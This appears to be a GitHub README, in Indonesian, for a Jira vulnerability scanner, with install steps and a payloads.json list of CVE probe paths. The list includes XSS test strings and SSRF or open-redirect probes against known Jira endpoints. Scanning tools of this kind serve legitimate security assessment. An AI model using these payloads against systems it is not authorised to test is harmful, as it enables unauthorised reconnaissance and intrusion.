# Jira Vulnerability Scanner

**Jira Vulnerability Scanner** adalah alat otomatis yang dirancang untuk mengidentifikasi kerentanannya pada instance Jira dengan memeriksa berbagai CVE (Common Vulnerabilities and Exposures) yang diketahui. Alat ini memungkinkan administrator dan profesional keamanan untuk secara efisien menilai keamanan instance Jira mereka.

## Fitur Utama

- **Pemeriksaan Otomatis:** Memeriksa berbagai CVE yang diketahui pada instance Jira secara otomatis.
- **Laporan Terperinci:** Memberikan laporan yang jelas mengenai status kerentanannya, termasuk informasi tentang endpoint yang rentan dan tidak rentan.
- **Kemudahan Penggunaan:** Dirancang dengan antarmuka baris perintah yang sederhana untuk kemudahan penggunaan.

## Instalasi

1. **Cloning Repositori:**
```bash
git clone https://github.com/pwnosec/jira-vuln-scanner.git
cd jira-vuln-scanner
```
2. Instalasi Dependensi:
Pastikan Anda memiliki Python 3 dan pip terinstal. Kemudian, instal dependensi yang diperlukan:
```
pip3 install -r requirements.txt
```
3. Membuat Virtual Environment
Sebelum memulai, pastikan Anda telah menginstal Python 3 di sistem Anda. Kemudian, buat virtual environment untuk mengisolasi dependensi proyek:
```bash
python3 -m venv jiravuln
```
4. Aktifkan Virtual Environment Pada sistem Linux/MacOS:
```
source jiravuln/bin/activate
```
Pada sistem Windows:
```
.\venv\Scripts\activate
```
5. Penggunaan
Untuk memulai pemindaian, jalankan perintah berikut:
```
python3 jiracheck.py --url https://<url-jira-anda> --payloads payloads.json
```
Gantilah `<url-jira-anda>` dengan URL instance Jira Anda. Alat ini akan memeriksa berbagai endpoint yang rentan dan memberikan laporan mengenai status kerentanannya.

## Payloads
Payloads yang digunakan untuk memeriksa kerentanannya disimpan dalam file payloads.json. Berikut adalah beberapa payload yang digunakan:
```json
{
  "CVE-2017-9506": "/plugins/servlet/oauth/users/icon-uri?consumerUri=http://bing.com",
  "CVE-2018-5230": "/pages/<IFRAME%20SRC%3D%22javascript%3Aalert('XSS')%22>.vm",
  "CVE-2018-20824": "/plugins/servlet/Wallboard/?dashboardId=10000&dashboardId=10000&cyclePeriod=alert(document.domain)",
  "CVE-2019-3396": "/rest/tinymce/1/macro/preview",
  "CVE-2019-3402": "/secure/ConfigurePortalPages!default.jspa?view=search&searchOwnerUserName=<script>alert(1)</script>&Search=Search",
  "CVE-2019-3403": "/rest/api/2/user/picker?query=<user_name_here>",
  "CVE-2019-8442": "/s/thiscanbeanythingyouwant/_/META-INF/maven/com.atlassian.jira/atlassian-jira-webapp/pom.xml",
  "CVE-2019-8449": "/rest/api/latest/groupuserpicker?query=1&maxResults=50000&showAvatar=true",
  "CVE-2019-8451": "/plugins/servlet/gadgets/makeRequest?url=https://<host_name>:1337@example.com",
  "CVE-2019-11581": "/secure/ContactAdministrators!default.jspa",
  "CVE-2020-14178": "/browse.<project_key>",
  "CVE-2020-14179": "/secure/QueryComponent!Default.jspa",
  "CVE-2020-14181": "/secure/ViewUserHover.jspa?username=<uname>",
  "CVE-2020-36289": "/secure/QueryComponentRendererValue!Default.jspa?assignee=user:admin",
  "CVE-2020-36289 (alt)": "/servicedesk/customer/user/signup",
  "CVE-2020-36289 (alt)": "/jira/projects",
  "jira-unauth-popular-filters": "/secure/ManageFilters.jspa?filterView=popular",
  "jira-unauthenticated-dashboards": "/rest/api/2/dashboard?maxResults=100",
  "Resolution found": "/rest/api/2/resolution",
  "Admin Project Dashboard Accessible": "/rest/menu/latest/admin",
  "Project Group Found": "/rest/api/2/projectCategory?maxResults=100",
  "Medium - Service Desk Signup Enable": "/servicedesk/customer/user/signup",
  "LOW - Query Component Field": "/secure/QueryComponents!Jql.jspa?jql="
}
```
Payloads ini digunakan untuk memeriksa kerentanannya pada berbagai endpoint di instance Jira Anda.

### Referensi
Untuk informasi lebih lanjut mengenai CVE yang digunakan dalam pemindaian ini, Anda dapat merujuk ke sumber-sumber berikut:

- CVE-2017-9506
- CVE-2018-5230
- CVE-2018-20824
- CVE-2019-3396
- CVE-2019-3402
- CVE-2019-3403
- CVE-2019-8442
- CVE-2019-8449


<p align="center">
  <a href="[https://star-history.com/#pwnosec/jira-vuln-scanner&Date](https://avatars.githubusercontent.com/u/29165227?v=4)">
   <picture>
     <source media="(prefers-color-scheme: dark)" srcset="https://api.star-history.com/svg?repos=pwnosec/jira-vuln-scanner&type=Date&theme=dark" />
     <source media="(prefers-color-scheme: light)" srcset="https://api.star-history.com/svg?repos=pwnosec/jira-vuln-scanner&type=Date" />
     <img alt="Star History Chart" src="https://api.star-history.com/svg?repos=pwnosec/jira-vuln-scanner&type=Date" />
   </picture>
  </a>
</p>
